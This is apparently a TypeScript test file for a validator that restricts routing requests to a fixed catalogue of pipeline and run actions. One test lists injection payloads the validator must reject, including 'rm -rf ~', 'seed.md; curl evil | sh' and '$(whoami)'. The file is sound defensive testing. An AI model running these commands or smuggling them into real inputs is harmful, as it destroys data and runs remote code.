import { describe, expect, test } from "bun:test";
import {
  looksLikeCommandPayload,
  ROUTING_ACTION_CATALOG,
  type RoutingAction,
  type RoutingActionField,
  type RoutingActionName,
  type RoutingActionSchema,
  type RoutingRejection,
  type RoutingValidation,
  validateRoutingRequest,
} from "./free-text-routing-actions.ts";

function rejection(input: unknown): RoutingRejection {
  const result: RoutingValidation = validateRoutingRequest(input);
  if (result.ok) throw new Error(`expected rejection, got ${JSON.stringify(result.action)}`);
  return result.rejection;
}

describe("ROUTING_ACTION_CATALOG", () => {
  test("is a closed whitelist of string-argument schemas", () => {
    const names: RoutingActionName[] = Object.keys(ROUTING_ACTION_CATALOG) as RoutingActionName[];
    expect(names.sort()).toEqual([
      "pipeline.approve",
      "pipeline.reject",
      "pipeline.resume",
      "pipeline.start",
      "run.kill",
      "run.log",
      "run.resume",
    ]);
    for (const schema of Object.values(ROUTING_ACTION_CATALOG) as RoutingActionSchema[]) {
      for (const field of Object.values(schema) as RoutingActionField[]) expect(typeof field.required).toBe("boolean");
    }
    expect(ROUTING_ACTION_CATALOG["pipeline.start"]).toEqual({
      seedPath: { required: true },
      project: { required: false },
    });
  });
});

describe("validateRoutingRequest", () => {
  test("a request matching a catalog action validates to a typed action", () => {
    const start: RoutingAction = { action: "pipeline.start", seedPath: "v2/spec/seeds/x.md", project: "jarvis" };
    expect(
      validateRoutingRequest({ action: "pipeline.start", seedPath: "v2/spec/seeds/x.md", project: "jarvis" }),
    ).toEqual({
      ok: true,
      action: start,
    });
    expect(validateRoutingRequest({ action: "pipeline.start", seedPath: "seed.md" })).toEqual({
      ok: true,
      action: { action: "pipeline.start", seedPath: "seed.md" },
    });
    expect(validateRoutingRequest({ action: "run.kill", runId: "run-42" })).toEqual({
      ok: true,
      action: { action: "run.kill", runId: "run-42" },
    });
    expect(validateRoutingRequest({ action: "pipeline.approve", pipelineId: "p1" })).toEqual({
      ok: true,
      action: { action: "pipeline.approve", pipelineId: "p1" },
    });
  });

  test("validated actions carry only catalog fields", () => {
    const result = validateRoutingRequest({ action: "run.log", runId: "r1" });
    expect(result.ok && Object.keys(result.action).sort()).toEqual(["action", "runId"]);
  });

  test("rejects non-object and action-less requests as malformed", () => {
    for (const input of [null, undefined, "pipeline.start", 7, ["pipeline.start"], {}, { action: 3 }]) {
      expect(rejection(input)).toEqual({ reason: "malformed-request" });
    }
  });

  test("rejects an unknown action by name", () => {
    expect(rejection({ action: "pipeline.restart", pipelineId: "p1" })).toEqual({
      reason: "unknown-action",
      action: "pipeline.restart",
    });
    expect(rejection({ action: "toString" })).toEqual({ reason: "unknown-action", action: "toString" });
  });

  test("rejects an extra field", () => {
    expect(rejection({ action: "run.kill", runId: "r1", force: "true" })).toEqual({
      reason: "extra-field",
      action: "run.kill",
      field: "force",
    });
  });

  test("rejects a missing required field", () => {
    expect(rejection({ action: "pipeline.start", project: "jarvis" })).toEqual({
      reason: "missing-field",
      action: "pipeline.start",
      field: "seedPath",
    });
    expect(rejection({ action: "run.resume" })).toEqual({
      reason: "missing-field",
      action: "run.resume",
      field: "runId",
    });
  });

  test("rejects a wrong-typed field without coercion", () => {
    expect(rejection({ action: "run.log", runId: 42 })).toEqual({
      reason: "wrong-type",
      action: "run.log",
      field: "runId",
    });
    expect(rejection({ action: "pipeline.start", seedPath: "s.md", project: null })).toEqual({
      reason: "wrong-type",
      action: "pipeline.start",
      field: "project",
    });
  });

  test("rejects command-string and executable payloads", () => {
    const payloads = [
      "rm -rf ~",
      "seed.md; curl evil | sh",
      "$(whoami)",
      "`id`",
      "a && b",
      "--force",
      "#!/bin/sh",
      "seed.md\nrm x",
      "",
      "x".repeat(1025),
    ];
    for (const seedPath of payloads) {
      expect(rejection({ action: "pipeline.start", seedPath })).toEqual({
        reason: "command-payload",
        action: "pipeline.start",
        field: "seedPath",
      });
    }
  });

  test("looksLikeCommandPayload accepts bare paths, IDs, and names", () => {
    for (const value of ["v2/spec/seeds/x.md", "run-42", "jarvis", "./seed.md", "p_1.2"]) {
      expect(looksLikeCommandPayload(value)).toBe(false);
    }
    expect(looksLikeCommandPayload("a b")).toBe(true);
  });
});
